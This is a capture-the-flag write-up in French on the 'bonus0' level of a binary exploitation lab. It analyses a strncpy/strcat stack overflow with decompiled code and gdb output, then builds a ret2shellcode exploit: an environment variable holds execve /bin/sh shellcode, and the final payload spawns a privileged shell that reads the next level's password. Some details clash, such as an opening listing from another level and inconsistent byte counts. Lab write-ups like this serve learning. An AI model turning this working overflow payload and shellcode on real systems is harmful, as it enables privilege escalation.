Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```bash
$ id && pwd && ls -la
uid=2008(level8) gid=2008(level8) groups=2008(level8),100(users)
/home/user/level8
total 17
dr-xr-x---+ 1 level8 level8   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level8 level8  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level8 level8 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level9 users  6057 Mar  6  2016 level8
-rw-r--r--+ 1 level8 level8   65 Sep 23  2015 .pass
-rw-r--r--  1 level8 level8  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire `bonus0` :

```bash
$ ./bonus0
 -
da
 -
b
da b
```

Sans succès, je me penche dès lors sur la décompilation.
J'utilise [Dogbolt](https://dogbolt.org/?id=e155fda2-581f-4305-ad94-25b044fdefd5#BinaryNinja=114&Reko=89) afin de décompiler le binaire du `bonus0`, qui a des protections contre la décompilation, mais certains décompilateurs réussissent.

Je recoupe la sortie de `RetDec` avec l'ASM et en extrait le probable code suivant :

```c
unsigned short *a = 32;

void p(char *string, char *string2) // <--------1 received string, 20 bytes buffer
{
    char buffer[4096];

    puts(string2);
    read(0, buffer, 4096);
    *strchr(buffer, '\n') = 0;
    strncpy(string, buffer, 20); // <-----------2 writes 20 bytes of buffer into string, but null terminator is not manually added, meaning we could "concat" to adjacent memory
}


void pp(char *string)
{
    char buffer[20];
    char buffer2[20];

    p(buffer2, " - ");
    p(buffer, " - ");

    strcpy(string, buffer2); // <---------------3 string is 42 bytes buffer, and due to 2., will contain both buffers, leaving 2 bytes before overflow

    string[strlen(string)] = *a;

    strcat(string, buffer); // <----------------4 this concat means string will overflow by 18 bytes (20 from buffer - 2 remaining), allowing for a Ret2Libc
}

int main()
{
    char buffer[42];

    pp(buffer);
    puts(buffer);

    return 0; // <------------------------------5 overflow overwrite this to point to shellcode running /bin/sh
}
```

Je ne remarque pas d'appel système ici, il s'agirait donc d'exécuter du code arbitraire. Je cherche la vulnérabilité possible.

Je remarque une faille possible dans `p()` :

```c
strncpy(string, buffer, 20);
```

Cette ligne copie 20 caractères de buffer dans string ce qui est sa taille, en revanche le null terminator n'est pas ajouté par strncpy, donc, si buffer écrit 20 caractères ou plus, alors string ne sera pas null terminated et pointera donc sur string2.

Dans `pp()` :

```c
    strcpy(string, buffer2);
```

On voit qu'ici, `string` va prendre la valeur de `buffer2`, mais comme il vient d'être altéré sans null terminator par `p()`, et bien il copiera également le contenu de `buffer` puisqu'il est adjacent dans la mémoire.

Cela donnera à `string` une taille de 40 bytes, et sa taille maximale est 42 bytes, or, à la fin de `pp()` :

```c
    strcat(string, buffer);
```

Va ajouter les 20 bytes de `buffer` à `string` et va donc causer un overflow sur 19 bytes.

J'utilise `gdb` afin de déterminer la taille de la stack et savoir combien de bytes de padding sont nécessaire afin de ré-écrire l'adresse de retour de `main()` :

```h
$ gdb ./bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   ...
   0x080485c5 <+33>:    mov    $0x0,%eax
   0x080485ca <+38>:    leave <------------------ breakpoint avant de leave
   0x080485cb <+39>:    ret
End of assembler dump.
(gdb) b *main+38
Breakpoint 1 at 0x80485ca
(gdb) r
Starting program: /home/user/bonus0/bonus0
 -

 -

Breakpoint 1, 0x080485ca in main ()
(gdb) info registers
...
esp            0xbffff6f0       0xbffff6f0
ebp            0xbffff738       0xbffff738
...
```

Je fais le calcul du padding avec : `ebp` - `esp` soit `0xbffff738 - 0xbffff6f0= 0x48 = 72` bytes.

Je soustrais la différence de la position du buffer dans la stack : 

```h
(gdb) disas main
Dump of assembler code for function main:
   0x080485a4 <+0>:     push   %ebp
   0x080485a5 <+1>:     mov    %esp,%ebp
   0x080485a7 <+3>:     and    $0xfffffff0,%esp
   0x080485aa <+6>:     sub    $0x40,%esp 
   0x080485ad <+9>:     lea    0x16(%esp),%eax <------------ ici
```

Soit `0x48 - 0x16 = 0x32 = 50` bytes. Cela me donne le nombre de bytes pour atteindre `ebp`, j'ajoute 4 bytes pour atteindre la `return address` soit 54 bytes de padding avant de pouvoir ré-écrire sur cette dernière et devenir la nouvelle adresse de `ret` pour `main()`.

Je dois bien prendre en compte que mon payload va être re-structuré par l'exécution du binaire et l'espace que j'ai :

- 20 bytes sur `buffer2` puisque je n'ai plus la null termination
- 19 bytes sur `buffer` + 1 pour la null termination
- 2 bytes "restant" sur le buffer d'origine dans `main()`
- 19 bytes à nouveau puisque `buffer` est re-concatené

J'atteint l'adresse de retour au bout de 54 bytes, et j'en ai 59 possible à l'écriture, il faut donc que je place l'adresse de retour de mon exploit 5 bytes avant la fin du buffer.

Mon payload ressemblerait donc à `buffer2 + buffer1 + buffer1`, il me faudrait donc le construire ainsi :

```h
'\x90' * 20 + '\x90' * 14 + adresse sur 4 bytes + '\x90'
```

Cela devrait placer l'adresse au (20 + 14 + 4 + 1 + 14 = 54ème) bytes.
Etant donné que je n'ai que 4 bytes, je ne peux pas utiliser la méthode `Ret2Libc`, mais je peux utiliser `Ret2Shellcode` en utilisant l'adresse du [shellcode](https://shell-storm.org/shellcode/files/shellcode-827.html) stocké dans une variable environnement avec un `NOP sled` le précédant, pour l'alignement :

```bash
$ export BYE=$'\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
```

Ayant fait l'erreur dans `Override`, je ne la reproduis pas ici, en nomant ma variable environnement sur 4 bytes afin d'obtenir l'adresse du début du `NOP sled` et non de son nom, et ajoute le `$` pour gérer les escape sequence `\x`.

Je récupère l'adresse de la variable environnement dans la mémoire du binaire :

```h
$ gdb ./bonus0 -q
Reading symbols from /home/user/bonus0/bonus0...(no debugging symbols found)...done.
(gdb) b main
Breakpoint 1 at 0x80485a7
(gdb) r
Starting program: /home/user/bonus0/bonus0

Breakpoint 1, 0x080485a7 in main ()
(gdb) x/100s environ
...
0xbfffff1d:      "BYE=\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v̀"
...

(gdb) x/100x 0xbfffff1d
0xbfffff1d:     0x42    0x59    0x45    0x3d    0x90    0x90    0x90    0x90
0xbfffff25:     0x31    0xc0    0x50    0x68    0x2f    0x2f    0x73    0x68
0xbfffff2d:     0x68    0x2f    0x62    0x69    0x6e    0x89    0xe3    0x50
0xbfffff35:     0x53    0x89    0xe1    0xb0    0x0b    0xcd    0x80    0x00
0xbfffff3d:     0x4c    0x49    0x4e    0x45    0x53    0x3d    0x35    0x31
0xbfffff45:     0x00    0x53    0x48    0x4c    0x56    0x4c    0x3d    0x32
0xbfffff4d:     0x00    0x48    0x4f    0x4d    0x45    0x3d    0x2f    0x68
0xbfffff55:     0x6f    0x6d    0x65    0x2f    0x75    0x73    0x65    0x72
0xbfffff5d:     0x2f    0x62    0x6f    0x6e    0x75    0x73    0x30    0x00
0xbfffff65:     0x4c    0x4f    0x47    0x4e    0x41    0x4d    0x45    0x3d
0xbfffff6d:     0x62    0x6f    0x6e    0x75    0x73    0x30    0x00    0x53
0xbfffff75:     0x53    0x48    0x5f    0x43    0x4f    0x4e    0x4e    0x45
0xbfffff7d:     0x43    0x54    0x49    0x4f
```

Je vois mon `NOP sled` à la fin de la première adresse, et prend donc la seconde : `0xbfffff25` dont le premier byte `\x31` correspond bien au premier byte de mon shellcode.

Je peux donc tenter de construire mon payload :

```python
python -c 'print "\x90" * 20'; python -c 'print "\x90" * 14 + "\xbf\xff\xff\x25"[::-1] + "\x90"'
```

Ce qui remplis le premier buffer de `NOP`, puis le second de 14 bytes de `NOP` et enfin l'adresse qui pointe sur le shellcode, puis 1 byte qui correspondait a la null termination du buffer (1).

Je l'essaye :

```bash
$ (python -c 'print "\x90" * 20'; python -c 'print "\x90" * 14 + "\xbf\xff\xff\x25"[::-1] + "\x90"'; cat) | ./bonus0
 -
 -
����������������������������������%���� ��������������%����
whoami
bonus1
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```
